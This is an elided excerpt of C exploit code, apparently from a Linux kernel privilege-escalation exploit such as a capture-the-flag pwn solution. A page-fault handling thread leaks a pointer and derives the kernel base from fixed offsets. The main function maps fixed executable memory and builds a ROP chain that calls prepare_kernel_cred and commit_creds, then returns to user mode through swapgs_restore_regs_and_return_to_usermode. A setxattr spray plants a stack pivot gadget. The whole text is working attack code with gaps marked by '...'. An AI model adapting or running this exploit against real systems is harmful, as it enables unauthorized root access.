...
static void* fault_handler_thread(void *arg)
{
    ...
    while(poll(&pollfd, 1, -1) > 0){
      ...
      pop(&hogebuf);
      data_base = hogebuf - 0x92ca0;
      kernel_base = data_base - 0x1400000;
...
int main(int argc, char **argv,char **envp){
    ...
    save_state();
    dev_open();
    int64_t* stack_ = mmap(0x83ffe000,0x2000,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1,0);
    stack_[0]=69;
    *(stack_+0x1000/8)=0;
    int64_t* rop = 0x83ffef94;
    ...
    int64_t stack_pivot = kernel_base+0x5d6110; //mov esp,0x83ffef94 ; ret
    u_int64_t off = 0;
    rop[off++] = kernel_base + 0x3c1b8c; // pop rdi ; ret
    rop[off++] = 0;
    rop[off++] = kernel_base + 0x83880; // prepare_kernel_cred
    rop[off++] = kernel_base + 0xeba88; // mov rdi, rax; mov .... ;ret
    rop[off++] = kernel_base + 0x834e0; // commit_creds
    rop[off++] = kernel_base + 0xc00a2f + 22;// swapgs_restore_regs_and_return_to_usermode+22
    rop[off++] = 0; // dummy rax
    rop[off++] = 0; // dummy rdi
    rop[off++] = user_ip;
    rop[off++] = user_cs;
    ...
    int64_t hehe[4] = {0};
    hehe[3] = stack_pivot;
    setxattr("/tmp", "SHE_IS_SUMMER", hehe, sizeof(hehe), XATTR_CREATE);
    read(sfd, buf, 0x10);
    return 0;
}